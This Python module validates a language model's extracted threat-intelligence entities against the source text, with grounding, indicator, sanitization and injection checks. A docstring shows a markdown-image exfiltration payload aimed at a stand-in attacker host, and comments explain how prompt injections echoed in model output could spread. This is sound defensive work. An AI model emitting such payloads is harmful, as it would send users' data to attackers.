"""Guardrail layer 3: nothing the model says is trusted until it is checked against the source.

This is the heart of the project's security story. The model is treated as an untrusted
component that proposes claims; this module decides which claims survive. Every check drops
items rather than repairing them, and every drop is recorded with a reason so the UI can show
exactly what was rejected and why.

The checks, in order:

1. Schema — Pydantic. Bad types and relations never get further.
2. Text safety — strip HTML and markdown link/image syntax from every string.
3. Grounding — `evidence` must appear verbatim in the chunk, after normalization that
   tolerates how PDFs mangle whitespace and punctuation but not changes in wording.
4. Indicator check — an `indicator` entity must match an indicator regex already found.
   This is what enforces CLAUDE.md's rule that the model never invents an IOC.
5. Name presence — the entity name, or one alias, must appear in the chunk.
6. Relationship integrity — both ends must resolve to a kept entity or a known indicator.
"""

from __future__ import annotations

import re
import unicodedata
from dataclasses import dataclass, field
from typing import Any

from pydantic import ValidationError

from .iocs import refang
from .models import IOCExtraction
from .schema import (
    MAX_ENTITIES,
    MAX_NAME_CHARS,
    MAX_RELATIONSHIPS,
    Entity,
    ExtractionResult,
    Relationship,
)

# Reason codes. Kept as constants because the UI groups by them.
REASON_SCHEMA = "schema"
REASON_NOT_GROUNDED = "not_grounded"
REASON_UNKNOWN_INDICATOR = "unknown_indicator"
REASON_NAME_NOT_IN_TEXT = "name_not_in_text"
REASON_DANGLING = "dangling"
REASON_LIMIT = "limit"
# Phase 5: the model's own output carried an injection pattern, which means either the model
# echoed an attack back or it is relaying one. Either way the item does not belong in the graph.
REASON_INJECTED_OUTPUT = "injected_output"
REASON_BAD_NAME = "bad_name"

ALL_REASONS = (
    REASON_SCHEMA,
    REASON_NOT_GROUNDED,
    REASON_UNKNOWN_INDICATOR,
    REASON_NAME_NOT_IN_TEXT,
    REASON_DANGLING,
    REASON_LIMIT,
    REASON_INJECTED_OUTPUT,
    REASON_BAD_NAME,
)

_URL_IN_NAME = re.compile(r"https?://|hxxps?://|\bwww\.", re.IGNORECASE)
_RESIDUAL_MARKUP = re.compile(r"<[a-zA-Z/!]|!\[[^\]]*\]\(|\]\(https?://")

_HTML_TAG = re.compile(r"<[^>]{0,200}>")
_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]{0,200}\]\([^)]{0,500}\)")
_MARKDOWN_LINK = re.compile(r"\[([^\]]{0,200})\]\([^)]{0,500}\)")
_SOFT_HYPHEN = "­"

# Characters PDFs and word processors substitute, unified before comparing text.
_PUNCTUATION_MAP = {
    "‘": "'",
    "’": "'",
    "‚": "'",
    "‛": "'",
    "“": '"',
    "”": '"',
    "„": '"',
    "′": "'",
    "″": '"',
    "‐": "-",
    "‑": "-",
    "‒": "-",
    "–": "-",
    "—": "-",
    "―": "-",
    "−": "-",
    " ": " ",
    "…": "...",
}


def normalize_for_grounding(text: str) -> str:
    """Canonical form for substring comparison.

    Tolerates the differences a PDF introduces — line breaks inside a sentence, curly quotes,
    en dashes, soft hyphens, doubled spaces, case — while preserving the words themselves. A
    quote that differs in wording still fails, which is the point: this must not become so
    permissive that a paraphrase passes as a verbatim quote.
    """
    text = unicodedata.normalize("NFKC", text)
    text = text.replace(_SOFT_HYPHEN, "")
    for source, target in _PUNCTUATION_MAP.items():
        text = text.replace(source, target)
    # Join words split across a line break by a hyphen, as the PDF extractor does.
    text = re.sub(r"(\w)-\s*\n\s*(\w)", r"\1\2", text)
    text = re.sub(r"\s+", " ", text)
    return text.strip().casefold()


def strip_unsafe_text(value: str) -> str:
    """Remove HTML tags and markdown link/image syntax from a model-supplied string.

    Markdown images are the dangerous case: if model output were ever rendered as markdown,
    an injected `![](https://attacker/?data=...)` would make the viewer's browser issue a
    request to the attacker carrying whatever data was interpolated into the URL. The app never
    renders model text as markdown, so this is defence in depth, not the only control.
    """
    value = _MARKDOWN_IMAGE.sub("", value)
    value = _MARKDOWN_LINK.sub(r"\1", value)
    value = _HTML_TAG.sub("", value)
    value = value.replace("­", "")
    return re.sub(r"\s+", " ", value).strip()


@dataclass
class DroppedItem:
    """One rejected claim, kept for display."""

    kind: str
    reason: str
    detail: str
    value: str = ""


@dataclass
class ValidationReport:
    """What survived, what did not, and why."""

    entities_proposed: int = 0
    relationships_proposed: int = 0
    entities_kept: int = 0
    relationships_kept: int = 0
    dropped: list[DroppedItem] = field(default_factory=list)
    schema_errors: list[str] = field(default_factory=list)
    retried: bool = False
    chunk_failed: bool = False

    def drop(self, kind: str, reason: str, detail: str, value: str = "") -> None:
        self.dropped.append(DroppedItem(kind=kind, reason=reason, detail=detail, value=value))

    @property
    def dropped_count(self) -> int:
        return len(self.dropped)

    def counts_by_reason(self) -> dict[str, int]:
        counts: dict[str, int] = {}
        for item in self.dropped:
            counts[item.reason] = counts.get(item.reason, 0) + 1
        return counts

    @property
    def proposed_total(self) -> int:
        return self.entities_proposed + self.relationships_proposed

    @property
    def kept_total(self) -> int:
        return self.entities_kept + self.relationships_kept

    @property
    def drop_rate(self) -> float:
        if self.proposed_total == 0:
            return 0.0
        return self.dropped_count / self.proposed_total

    @property
    def suspicious(self) -> bool:
        """More than half the chunk rejected is a signal worth surfacing.

        Either the model is behaving oddly or the text is adversarial; both are worth a human
        looking at the report.
        """
        return self.proposed_total > 0 and self.drop_rate > 0.5

    def merge(self, other: ValidationReport) -> None:
        self.entities_proposed += other.entities_proposed
        self.relationships_proposed += other.relationships_proposed
        self.entities_kept += other.entities_kept
        self.relationships_kept += other.relationships_kept
        self.dropped.extend(other.dropped)
        self.schema_errors.extend(other.schema_errors)
        self.retried = self.retried or other.retried
        self.chunk_failed = self.chunk_failed or other.chunk_failed


def output_is_injected(*values: str) -> str | None:
    """Return the matched pattern name if any model-supplied string carries a HIGH pattern.

    Guardrail layer 3 applied to the model's own words. If an injection made it through the
    input layers and the model repeated it in a description or a name, that text must not be
    stored: it would sit in the graph, be shown to other users, and be fed back to the model as
    evidence when a summary is generated later.
    """
    # Imported here: `guards` imports `extract.schema`, so a module-level import would cycle.
    from guards.injection import scan_for_injection

    for value in values:
        if not value:
            continue
        scan = scan_for_injection(value)
        if scan.has_high:
            return scan.high[0].pattern_name
    return None


def name_is_unacceptable(name: str) -> str | None:
    """Reject entity names that cannot be legitimate. Returns a reason, or None."""
    if "\n" in name or "\r" in name:
        return "name contains a line break"
    if len(name) > MAX_NAME_CHARS:
        return f"name longer than {MAX_NAME_CHARS} characters"
    if _URL_IN_NAME.search(name):
        return "name contains a URL"
    return None


def has_residual_markup(*values: str) -> bool:
    """Defence in depth: markup that survived stripping means something is wrong.

    `strip_unsafe_text` should have removed all of it. If any remains, the safest response is to
    drop the item rather than work out why the stripper missed it.
    """
    return any(_RESIDUAL_MARKUP.search(value) for value in values if value)


def _indicator_lookup(ioc_extraction: IOCExtraction) -> dict[str, str]:
    """Normalized indicator value -> canonical value, for the indicator check."""
    lookup: dict[str, str] = {}
    for ioc in ioc_extraction.iocs:
        lookup[ioc.value.casefold()] = ioc.value
        for form in ioc.original_forms:
            lookup[refang(form).casefold()] = ioc.value
    return lookup


def _entity_key(entity: Entity) -> str:
    return f"{entity.type}::{entity.name.casefold()}"


def validate(
    result_dict: dict[str, Any],
    chunk_text: str,
    ioc_extraction: IOCExtraction,
) -> tuple[ExtractionResult, ValidationReport]:
    """Validate one chunk's model output against the chunk text and the regex indicators."""
    report = ValidationReport()

    # 1. Schema. Invalid entity or relation types are rejected here by the Literal types.
    try:
        parsed = ExtractionResult.model_validate(result_dict)
    except ValidationError as exc:
        report.schema_errors.append(_summarize_validation_error(exc))
        report.chunk_failed = True
        report.drop("chunk", REASON_SCHEMA, _summarize_validation_error(exc))
        return ExtractionResult(), report

    report.entities_proposed = len(parsed.entities)
    report.relationships_proposed = len(parsed.relationships)

    normalized_chunk = normalize_for_grounding(chunk_text)
    indicators = _indicator_lookup(ioc_extraction)

    kept_entities: list[Entity] = []
    kept_keys: set[str] = set()
    kept_names: set[str] = set()

    for entity in parsed.entities:
        if len(kept_entities) >= MAX_ENTITIES:
            report.drop("entity", REASON_LIMIT, f"over the {MAX_ENTITIES}-entity cap", entity.name)
            continue

        # 2. Text safety on every string before any other check.
        name = strip_unsafe_text(entity.name)
        description = strip_unsafe_text(entity.description)
        aliases = [strip_unsafe_text(alias) for alias in entity.aliases]
        aliases = [alias for alias in aliases if alias]
        evidence = strip_unsafe_text(entity.evidence)

        if not name:
            report.drop("entity", REASON_NAME_NOT_IN_TEXT, "name empty after sanitization")
            continue

        # 2b. Phase 5: the model's own output must not carry an injection, and a name must look
        # like a name. Checked before grounding so an injected string is never echoed into a
        # drop reason that the UI then displays.
        injected = output_is_injected(name, description, *aliases)
        if injected:
            report.drop(
                "entity",
                REASON_INJECTED_OUTPUT,
                f"model output contained an injection pattern ({injected})",
                name[:60],
            )
            continue

        bad_name = name_is_unacceptable(name)
        if bad_name and entity.type != "indicator":
            # Indicators legitimately contain URLs, so the URL rule does not apply to them.
            report.drop("entity", REASON_BAD_NAME, bad_name, name[:60])
            continue

        if has_residual_markup(name, description):
            report.drop(
                "entity", REASON_INJECTED_OUTPUT, "markup survived sanitization", name[:60]
            )
            continue

        # 3. Grounding.
        if not evidence or normalize_for_grounding(evidence) not in normalized_chunk:
            report.drop(
                "entity",
                REASON_NOT_GROUNDED,
                "evidence quote does not appear in the source text",
                name,
            )
            continue

        # 4. Indicator values must come from regex extraction, never from the model.
        if entity.type == "indicator":
            canonical = indicators.get(refang(name).casefold())
            if canonical is None:
                report.drop(
                    "entity",
                    REASON_UNKNOWN_INDICATOR,
                    "indicator value was not found by regex extraction",
                    name,
                )
                continue
            name = canonical

        # 5. The name, or one alias, must actually appear in the chunk.
        candidates = [name, *aliases]
        if not any(normalize_for_grounding(candidate) in normalized_chunk for candidate in candidates):
            report.drop(
                "entity", REASON_NAME_NOT_IN_TEXT, "name and aliases absent from the text", name
            )
            continue

        # Aliases individually must appear too; silently drop the ones that do not rather than
        # losing the whole entity over a hallucinated alias.
        aliases = [
            alias
            for alias in aliases
            if normalize_for_grounding(alias) in normalized_chunk and alias.casefold() != name.casefold()
        ]

        cleaned = Entity(
            name=name,
            type=entity.type,
            aliases=aliases,
            description=description,
            evidence=evidence,
        )
        key = _entity_key(cleaned)
        if key in kept_keys:
            continue
        kept_keys.add(key)
        kept_names.add(name.casefold())
        kept_entities.append(cleaned)

    kept_relationships: list[Relationship] = []
    seen_relationships: set[tuple[str, str, str]] = set()

    for relationship in parsed.relationships:
        if len(kept_relationships) >= MAX_RELATIONSHIPS:
            report.drop("relationship", REASON_LIMIT, f"over the {MAX_RELATIONSHIPS} cap")
            continue

        source = strip_unsafe_text(relationship.source)
        target = strip_unsafe_text(relationship.target)
        evidence = strip_unsafe_text(relationship.evidence)
        label = f"{source} {relationship.relation} {target}"

        if not source or not target:
            report.drop("relationship", REASON_DANGLING, "empty source or target", label)
            continue

        injected = output_is_injected(source, target)
        if injected:
            report.drop(
                "relationship",
                REASON_INJECTED_OUTPUT,
                f"model output contained an injection pattern ({injected})",
                label[:60],
            )
            continue

        if not evidence or normalize_for_grounding(evidence) not in normalized_chunk:
            report.drop(
                "relationship",
                REASON_NOT_GROUNDED,
                "evidence quote does not appear in the source text",
                label,
            )
            continue

        # 6. Both ends must resolve to something we kept or to a known indicator.
        source_resolved = _resolve_endpoint(source, kept_names, indicators)
        target_resolved = _resolve_endpoint(target, kept_names, indicators)
        if source_resolved is None or target_resolved is None:
            missing = source if source_resolved is None else target
            report.drop(
                "relationship",
                REASON_DANGLING,
                f"'{missing}' is not a kept entity or a known indicator",
                label,
            )
            continue

        signature = (source_resolved.casefold(), relationship.relation, target_resolved.casefold())
        if signature in seen_relationships:
            continue
        seen_relationships.add(signature)

        kept_relationships.append(
            Relationship(
                source=source_resolved,
                relation=relationship.relation,
                target=target_resolved,
                evidence=evidence,
            )
        )

    report.entities_kept = len(kept_entities)
    report.relationships_kept = len(kept_relationships)

    return ExtractionResult(entities=kept_entities, relationships=kept_relationships), report


def _resolve_endpoint(
    name: str, kept_names: set[str], indicators: dict[str, str]
) -> str | None:
    """Resolve a relationship endpoint to a canonical name, or None if it dangles."""
    if name.casefold() in kept_names:
        return name
    canonical = indicators.get(refang(name).casefold())
    if canonical is not None:
        return canonical
    return None


def _summarize_validation_error(exc: ValidationError) -> str:
    """A short, safe description of why parsing failed.

    Sent back to the model on the single retry, so it must describe the problem without
    echoing large amounts of untrusted content.
    """
    parts: list[str] = []
    for error in exc.errors()[:5]:
        location = ".".join(str(item) for item in error.get("loc", ()))
        parts.append(f"{location or 'root'}: {error.get('msg', 'invalid')}")
    return "; ".join(parts)
